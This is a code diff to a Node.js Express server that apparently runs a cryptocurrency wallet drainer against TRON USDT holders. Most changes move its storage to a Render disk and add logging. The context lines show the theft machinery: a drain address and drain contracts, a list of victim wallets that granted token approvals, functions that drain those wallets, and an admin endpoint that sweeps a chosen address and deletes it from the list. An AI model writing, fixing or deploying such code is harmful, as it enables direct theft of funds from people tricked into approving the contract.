@@ -14,72 +14,105 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// PERSISTENT STORAGE SETUP (FIX FOR RENDER)
+// PERSISTENT STORAGE SETUP (RENDER DISK)
 // ============================================================
 
-// Determine data directory - use Render's persistent disk if available
-const DATA_DIR = process.env.RENDER 
-  ? '/opt/render/project/src/data' 
-  : path.join(__dirname, 'data');
-
+// Use the Render disk mount path
+// IMPORTANT: This MUST match the mount path you set in Render
+const DATA_DIR = '/opt/render/project/src/data';
 const APPROVED_FILE = path.join(DATA_DIR, 'approved.json');
 const EVENTS_FILE = path.join(DATA_DIR, 'events.json');
 
-// Ensure data directory exists
+// Ensure data directory exists on the mounted disk
 function ensureDataDir() {
   try {
     if (!fs.existsSync(DATA_DIR)) {
       fs.mkdirSync(DATA_DIR, { recursive: true });
-      console.log('✅ Created data directory:', DATA_DIR);
+      console.log('✅ Created data directory on Render disk:', DATA_DIR);
     } else {
-      console.log('✅ Data directory exists:', DATA_DIR);
+      console.log('✅ Data directory exists on Render disk:', DATA_DIR);
     }
+    
+    // Test write permission
+    const testFile = path.join(DATA_DIR, '.write-test');
+    fs.writeFileSync(testFile, 'test');
+    fs.unlinkSync(testFile);
+    console.log('✅ Write permission confirmed on Render disk');
+    
   } catch (e) {
-    console.error('❌ Error creating data directory:', e.message);
-    // Fallback to local directory
+    console.error('❌ Error accessing Render disk:', e.message);
+    console.error('❌ Please make sure you added the disk in Render dashboard with mount path:', DATA_DIR);
+    console.error('❌ Falling back to local ./data directory');
+    
+    // Fallback to local directory if Render disk is not available
     const fallbackDir = path.join(__dirname, 'data');
     if (!fs.existsSync(fallbackDir)) {
       fs.mkdirSync(fallbackDir, { recursive: true });
       console.log('✅ Created fallback data directory:', fallbackDir);
     }
+    // Update paths to use fallback
+    return path.join(__dirname, 'data');
   }
+  return DATA_DIR;
 }
 
 // Ensure approved.json exists
-function ensureApprovedFile() {
+function ensureApprovedFile(dataDir) {
+  const approvedPath = path.join(dataDir, 'approved.json');
   try {
-    if (!fs.existsSync(APPROVED_FILE)) {
-      fs.writeFileSync(APPROVED_FILE, JSON.stringify([], null, 2));
-      console.log('✅ Created approved.json at:', APPROVED_FILE);
+    if (!fs.existsSync(approvedPath)) {
+      fs.writeFileSync(approvedPath, JSON.stringify([], null, 2));
+      console.log('✅ Created approved.json at:', approvedPath);
     } else {
-      console.log('✅ approved.json exists at:', APPROVED_FILE);
+      console.log('✅ approved.json exists at:', approvedPath);
+      // Verify it's readable
+      const content = fs.readFileSync(approvedPath, 'utf8');
+      JSON.parse(content);
+      console.log('✅ approved.json is valid');
     }
   } catch (e) {
-    console.error('❌ Error creating approved.json:', e.message);
+    console.error('❌ Error with approved.json:', e.message);
+    // Recreate if corrupted
+    try {
+      fs.writeFileSync(approvedPath, JSON.stringify([], null, 2));
+      console.log('✅ Recreated approved.json at:', approvedPath);
+    } catch (err) {
+      console.error('❌ Failed to recreate approved.json:', err.message);
+    }
   }
 }
 
 // Ensure events.json exists
-function ensureEventsFile() {
+function ensureEventsFile(dataDir) {
+  const eventsPath = path.join(dataDir, 'events.json');
   try {
-    if (!fs.existsSync(EVENTS_FILE)) {
-      fs.writeFileSync(EVENTS_FILE, JSON.stringify([], null, 2));
-      console.log('✅ Created events.json at:', EVENTS_FILE);
+    if (!fs.existsSync(eventsPath)) {
+      fs.writeFileSync(eventsPath, JSON.stringify([], null, 2));
+      console.log('✅ Created events.json at:', eventsPath);
     } else {
-      console.log('✅ events.json exists at:', EVENTS_FILE);
+      console.log('✅ events.json exists at:', eventsPath);
     }
   } catch (e) {
-    console.error('❌ Error creating events.json:', e.message);
+    console.error('❌ Error with events.json:', e.message);
+    try {
+      fs.writeFileSync(eventsPath, JSON.stringify([], null, 2));
+      console.log('✅ Recreated events.json at:', eventsPath);
+    } catch (err) {
+      console.error('❌ Failed to recreate events.json:', err.message);
+    }
   }
 }
 
 // ============================================================
-// LOAD/SAVE FUNCTIONS
+// LOAD/SAVE FUNCTIONS (Using Render Disk)
 // ============================================================
 
+let currentDataDir = DATA_DIR;
+
 function loadApproved() {
+  const filePath = path.join(currentDataDir, 'approved.json');
   try {
-    const data = fs.readFileSync(APPROVED_FILE, 'utf8');
+    const data = fs.readFileSync(filePath, 'utf8');
     return JSON.parse(data);
   } catch(e) {
     console.warn('⚠️ Could not read approved.json, returning empty array');
@@ -88,8 +121,9 @@ function loadApproved() {
 }
 
 function saveApproved(data) {
+  const filePath = path.join(currentDataDir, 'approved.json');
   try {
-    fs.writeFileSync(APPROVED_FILE, JSON.stringify(data, null, 2));
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
     console.log('✅ Saved approved.json, total:', data.length);
     return true;
   } catch(e) {
@@ -99,8 +133,9 @@ function saveApproved(data) {
 }
 
 function loadEvents() {
+  const filePath = path.join(currentDataDir, 'events.json');
   try {
-    const data = fs.readFileSync(EVENTS_FILE, 'utf8');
+    const data = fs.readFileSync(filePath, 'utf8');
     return JSON.parse(data);
   } catch(e) {
     return [];
@@ -108,8 +143,9 @@ function loadEvents() {
 }
 
 function saveEvents(data) {
+  const filePath = path.join(currentDataDir, 'events.json');
   try {
-    fs.writeFileSync(EVENTS_FILE, JSON.stringify(data, null, 2));
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
     return true;
   } catch(e) {
     console.error('❌ Error saving events.json:', e.message);
@@ -190,7 +226,7 @@ const USDT_DECIMALS = 6;
 const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
 
 let DRAIN_CONTRACT = process.env.DRAIN_CONTRACT || '';
-let CONTRACTS = []; // all deployed contracts (for draining old approvals)
+let CONTRACTS = [];
 let CONTRACT_ABI = null;
 
 // ============================================================
@@ -260,7 +296,6 @@ async function deployContract(abi, bytecode) {
     const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
     log('Contract deployed at:', contractAddr);
     
-    // Wait for confirmation
     await waitTxConfirmed(deployWeb, signed.txid || receipt.txid || tx.txID, 30000);
     
     return contractAddr;
@@ -326,7 +361,6 @@ async function waitTxConfirmed(tronWebInstance, txId, maxWaitMs) {
       }
     } catch(e) {
       lastError = e.message;
-      // Wait and retry
     }
     await new Promise(r => setTimeout(r, 1500));
   }
@@ -382,7 +416,6 @@ async function tryDrainWallet(drainWeb, address) {
     return { success: false, error: 'No contracts available' };
   }
 
-  // Check USDT contract
   let usdtContract;
   try {
     usdtContract = await drainWeb.contract().at(USDT_CONTRACT);
@@ -400,7 +433,6 @@ async function tryDrainWallet(drainWeb, address) {
       var result = await drainAllFrom(drainWeb, address, targets[i]);
       if (result.success) return result;
     } catch(e) {
-      // Continue to next contract
       console.log('Contract ' + targets[i] + ' failed:', e.message);
     }
   }
@@ -450,6 +482,7 @@ app.get('/api/config', async (req, res) => {
       drainContractHex: DRAIN_CONTRACT ? tronWeb.address.toHex(DRAIN_CONTRACT) : '',
       maxApprove: maxApprove,
       contracts: CONTRACTS || [],
+      dataDir: currentDataDir,
     });
   } catch (e) {
     log('Config error:', e.message);
@@ -652,7 +685,7 @@ app.post('/api/event', (req, res) => {
   }
 });
 
-// -------------------- APPROVE DONE (FIXED) --------------------
+// -------------------- APPROVE DONE (FIXED WITH DISK) --------------------
 app.post('/api/approve-done', (req, res) => {
   try {
     const { address } = req.body;
@@ -665,6 +698,8 @@ app.post('/api/approve-done', (req, res) => {
     
     const list = loadApproved();
     console.log('📋 Current approved list:', list.length);
+    console.log('📁 Data directory:', currentDataDir);
+    console.log('📄 File path:', path.join(currentDataDir, 'approved.json'));
     
     if (!list.find(w => w.address === address)) {
       list.push({ address, approvedAt: Date.now() });
@@ -766,11 +801,12 @@ app.get('/qr-session/:sessionId', (req, res) => {
   }
 });
 
-// -------------------- ADMIN: WALLETS (FIXED) --------------------
+// -------------------- ADMIN: WALLETS (FIXED WITH DISK) --------------------
 app.get('/api/admin/wallets', adminAuth, async (req, res) => {
   try {
     const list = loadApproved();
     console.log('📋 Admin wallets request, total:', list.length);
+    console.log('📁 Data directory:', currentDataDir);
     
     const result = [];
     
@@ -787,7 +823,7 @@ app.get('/api/admin/wallets', adminAuth, async (req, res) => {
       }
     }
     
-    res.json({ wallets: result, total: result.length });
+    res.json({ wallets: result, total: result.length, dataDir: currentDataDir });
   } catch(e) {
     log('Admin wallets error:', e.message);
     res.status(500).json({ error: e.message });
@@ -829,7 +865,6 @@ app.post('/api/admin/drain/:address', adminAuth, async (req, res) => {
 
     log('DRAIN ' + address + ' OK tx=' + drainAllResult.txId);
 
-    // If amount specified and less than balance, refund the rest
     if (amount && amount > 0 && amount < balance) {
       const refund = balance - amount;
       try {
@@ -872,7 +907,6 @@ app.post('/api/admin/drain/:address', adminAuth, async (req, res) => {
       }
     }
 
-    // Remove from approved list
     const list = loadApproved();
     const idx = list.findIndex(w => w.address === address);
     if (idx !== -1) { list.splice(idx, 1); saveApproved(list); }
@@ -986,7 +1020,6 @@ app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
     const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
     log('UPDATE-WALLET new contract deployed at: ' + contractAddr);
 
-    // Wait for confirmation
     const txId = signed.txid || receipt.txid || tx.txID;
     if (txId) {
       const conf = await waitTxConfirmed(deployWeb, txId, 30000);
@@ -995,7 +1028,6 @@ app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
       }
     }
 
-    // Store old contract in CONTRACTS for backward compatibility
     const oldContract = DRAIN_CONTRACT;
     if (oldContract && !CONTRACTS.includes(oldContract)) CONTRACTS.push(oldContract);
     DRAIN_CONTRACT = contractAddr;
@@ -1021,14 +1053,17 @@ app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
 // ============================================================
 
 app.get('/health', (req, res) => {
+  const approvedCount = loadApproved().length;
   res.json({
     status: 'ok',
     timestamp: new Date().toISOString(),
     drainContract: DRAIN_CONTRACT || 'not deployed',
     contracts: CONTRACTS.length,
-    approvedWallets: loadApproved().length,
-    dataDir: DATA_DIR,
-    renderEnvironment: !!process.env.RENDER
+    approvedWallets: approvedCount,
+    dataDir: currentDataDir,
+    renderEnvironment: !!process.env.RENDER,
+    diskMounted: fs.existsSync(currentDataDir),
+    approvedFileExists: fs.existsSync(path.join(currentDataDir, 'approved.json')),
   });
 });
 
@@ -1039,14 +1074,25 @@ app.get('/health', (req, res) => {
 async function start() {
   log('🚀 Starting server...');
   
-  // Initialize persistent storage
-  ensureDataDir();
-  ensureApprovedFile();
-  ensureEventsFile();
+  // Initialize persistent storage on Render disk
+  log('📁 Setting up Render disk at:', DATA_DIR);
+  const dataDir = ensureDataDir();
+  currentDataDir = dataDir;
   
-  log('📁 Data directory:', DATA_DIR);
-  log('📄 Approved file:', APPROVED_FILE);
-  log('📄 Events file:', EVENTS_FILE);
+  ensureApprovedFile(dataDir);
+  ensureEventsFile(dataDir);
+  
+  log('📁 Data directory:', currentDataDir);
+  log('📄 Approved file:', path.join(currentDataDir, 'approved.json'));
+  log('📄 Events file:', path.join(currentDataDir, 'events.json'));
+  
+  // Verify files are readable
+  try {
+    const testApproved = loadApproved();
+    log('✅ Approved file loaded, entries:', testApproved.length);
+  } catch(e) {
+    log('⚠️ Could not load approved file on startup:', e.message);
+  }
   
   log('🔑 USDT Contract:', USDT_CONTRACT);
   log('🏦 Drain Address:', DRAIN_ADDRESS || 'NOT SET');
@@ -1061,6 +1107,7 @@ async function start() {
   log('  DRAIN_CONTRACT:', DRAIN_CONTRACT || 'NOT DEPLOYED');
   log('  CONTRACTS:', CONTRACTS.length > 0 ? CONTRACTS.join(', ') : 'none');
   log('  Approved wallets:', approvedList.length);
+  log('  Data directory:', currentDataDir);
 
   // Start HTTP server
   app.listen(PORT, '0.0.0.0', () => {
